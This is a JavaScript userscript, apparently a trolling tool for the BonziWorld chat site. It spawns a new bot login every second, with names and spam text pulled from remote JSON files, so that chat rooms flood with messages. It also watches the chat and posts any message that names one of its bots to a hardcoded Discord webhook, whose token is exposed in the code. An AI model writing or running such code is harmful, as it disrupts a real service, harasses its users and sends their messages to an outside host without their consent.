/* GGTroll 4 BonziWorld 1.1.2 */
/* This comes with no warranty */
const bots = [];

const noserver = new MutationObserver(mutations => {
    mutations.forEach(mutation => {
        mutation.addedNodes.forEach(node => {
            if (
                node.nodeType === 1 &&
                node.classList.contains("bubble-content")
            ) {
                const text = node.textContent.trim();
                if (text) {
                    bots.forEach(botName => {
                        if (text.includes(botName)) {
                            fetch("https://discord.com/api/webhooks/1429973688446488586/T7Da6y5vMfl6AN9OktYnBYLkL_uioOqSPhHZClDGSHOlMcwRIEUGCQl2Hh81y0XqE-cA", {
                                method: "POST",
                                headers: { "Content-Type": "application/json" },
                                body: JSON.stringify({ content: text })
                            });
                        }
                    });
                }
            }
        });
    });
});
noserver.observe(document.body, { childList: true, subtree: true });

setInterval(async () => {
    (async () => {
        try {
            const res = await fetch("https://cmd-hue.github.io/fddstr.json?cb=" + Math.random());
            const data = await res.json();
            const strings = data.strings || ["tinyurl.com/ggtfiles"];
            const roomElement = document.querySelector(".room_id");
            const roomId = roomElement ? roomElement.textContent.trim() : "default";

            let botName = "giggity #" + Math.floor(Math.random() * 10000);

            if (Math.random() < 0.75) {
                const userRes = await fetch("https://cmd-hue.github.io/userbwn.json?cb=" + Math.random());
                const userData = await userRes.json();
                const names = userData.names || [];
                if (names.length > 0) {
                    botName = names[Math.floor(Math.random() * names.length)];
                }
            }

            bots.push(botName);
            const bot = io(location.href + "?cb=" + Math.random());
            bot.emit("client", "MAIN");
            bot.emit("login", {
                passcode: "",
                name: botName,
                room: roomId
            });
            setTimeout(() => {
                bot.emit("update", { color: "blue" });
            }, 2000);

            setInterval(() => {
                const msg = strings[Math.floor(Math.random() * strings.length)];
                const type = Math.random() < 0.5 ? "joke" : "fact";
                bot.emit("talk", { text: msg, type });
            }, 2000);

        } catch (e) {}
    })();
}, 1000);
